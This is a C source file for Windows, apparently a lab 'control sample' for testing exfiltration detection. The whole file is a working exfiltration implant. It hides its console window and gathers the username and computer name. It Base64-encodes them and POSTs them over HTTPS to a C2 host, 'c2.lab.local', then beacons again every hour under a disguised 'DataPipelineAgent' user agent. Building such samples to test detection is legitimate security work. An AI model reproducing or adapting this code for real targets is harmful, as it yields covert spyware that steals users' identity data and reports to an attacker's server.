/*
   A04_4c: Data Exfiltration Control Sample (HTTPS Base64 Blob Variant)
   Behavioral Scope: Local system metric aggregation, Base64 encoding, and HTTPS serialization.
*/

#include <windows.h>
#include <wininet.h>
#include <wincrypt.h> // Required for CryptBinaryToStringA
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib") // Required for GetUserNameA
#pragma comment(lib, "user32.lib")   // Required for ShowWindow and GetConsoleWindow
#pragma comment(lib, "crypt32.lib")  // Required for CryptBinaryToStringA

// Laboratory Configuration Constraints (Updated for HTTPS)
const char *SERVER_HOST = "c2.lab.local";
const char *SERVER_PATH = "/api/v1/report";
const int SERVER_PORT = 443; // Standard HTTPS Port

// Global Structural Telemetry Containers
char username[256] = {0};
char computer_name[256] = {0};

void gather_static_identity()
{
    DWORD size = sizeof(username);
    if (!GetUserNameA(username, &size))
    {
        strcpy_s(username, sizeof(username), "Unknown_User");
    }

    size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size))
    {
        strcpy_s(computer_name, sizeof(computer_name), "Unknown_Host");
    }
}

void get_timestamp(char *buffer, size_t buffer_size)
{
    time_t rawtime;
    struct tm timeinfo;
    time(&rawtime);
    localtime_s(&timeinfo, &rawtime);
    strftime(buffer, buffer_size, "%Y-%m-%d %H:%M:%S", &timeinfo);
}

// Helper function to Base64 encode an input string
// Returns a dynamically allocated buffer that must be freed by the caller
char *base64_encode(const char *input)
{
    DWORD input_len = (DWORD)strlen(input);
    DWORD output_len = 0;

    // First call: Determine the required buffer size
    // CRYPT_STRING_NOCRLF prevents the API from adding line breaks every 64 or 76 characters
    if (!CryptBinaryToStringA((const BYTE *)input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &output_len))
    {
        printf("[ERROR] Failed to calculate Base64 buffer size. Error: %lu\n", GetLastError());
        return NULL;
    }

    char *output = (char *)malloc(output_len);
    if (output == NULL)
    {
        printf("[ERROR] Memory allocation failed for Base64 output.\n");
        return NULL;
    }

    // Second call: Perform the actual encoding
    if (!CryptBinaryToStringA((const BYTE *)input, input_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, output, &output_len))
    {
        printf("[ERROR] Base64 encoding failed. Error: %lu\n", GetLastError());
        free(output);
        return NULL;
    }

    return output;
}

void exfiltrate_base64_blob(const char *raw_payload)
{
    // 1. Encode the raw payload into a Base64 string
    char *encoded_blob = base64_encode(raw_payload);
    if (encoded_blob == NULL)
    {
        return; // Encoding failed, abort transmission
    }

    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // Initialize the WinINet session
    hInternet = InternetOpenA("DataPipelineAgent/1.2", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        printf("[ERROR] InternetOpenA failed. Error: %lu\n", GetLastError());
        free(encoded_blob);
        return;
    }

    // Establish communication block to host destination (Port 443)
    hConnect = InternetConnectA(hInternet, SERVER_HOST, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (hConnect == NULL)
    {
        printf("[ERROR] InternetConnectA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        free(encoded_blob);
        return;
    }

    // Open an HTTP POST request handle and pass the INTERNET_FLAG_SECURE flag for HTTPS
    hRequest = HttpOpenRequestA(hConnect, "POST", SERVER_PATH, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (hRequest == NULL)
    {
        printf("[ERROR] HttpOpenRequestA failed. Error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(encoded_blob);
        return;
    }

    // Adjust header for an unformatted plain-text blob payload
    const char *headers = "Content-Type: text/plain\r\n";
    DWORD headers_len = (DWORD)strlen(headers);

    // Transmit the Base64 data stream to the laboratory server
    BOOL bSend = HttpSendRequestA(hRequest, headers, headers_len, (LPVOID)encoded_blob, (DWORD)strlen(encoded_blob));
    if (bSend)
    {
        printf("[INFO] Base64 blob exfiltration via HTTPS successful\n");
    }
    else
    {
        printf("[ERROR] HttpSendRequestA failed. Error: %lu\n", GetLastError());
    }

    // Free resources safely
    free(encoded_blob);
    HttpEndRequest(hRequest, NULL, 0, 0);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void log_login_info()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    // Reverting to standard JSON format strings before encoding
    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\"username\":\"%s\",\"computer_name\":\"%s\",\"login_time\":\"%s\"}",
              username, computer_name, time_buffer);

    exfiltrate_base64_blob(json_buffer);
}

void log_location()
{
    char time_buffer[64] = {0};
    char json_buffer[1024] = {0};
    get_timestamp(time_buffer, sizeof(time_buffer));

    sprintf_s(json_buffer, sizeof(json_buffer),
              "{\"username\":\"%s\",\"computer_name\":\"%s\",\"status\":\"location_heartbeat\",\"time\":\"%s\"}",
              username, computer_name, time_buffer);

    exfiltrate_base64_blob(json_buffer);
}

DWORD WINAPI PipelineWorkerThread(LPVOID lpParam)
{
    while (TRUE)
    {
        log_location();
        Sleep(3600000); // Wait exactly 1 hour
    }
    return 0;
}

int main()
{
    // Hide native prompt frame during data execution phase
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize global identifiers
    gather_static_identity();

    // Execute first data dispatch action
    log_login_info();

    // Create a background worker thread via Win32 process APIs
    HANDLE hThread = CreateThread(NULL, 0, PipelineWorkerThread, NULL, 0, NULL);
    if (hThread == NULL)
    {
        printf("[ERROR] CreateThread failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[INFO] HTTPS Base64 data exfiltration pipeline running in the background successfully\n");

    while (TRUE)
    {
        Sleep(10000);
    }

    CloseHandle(hThread);
    return 0;
}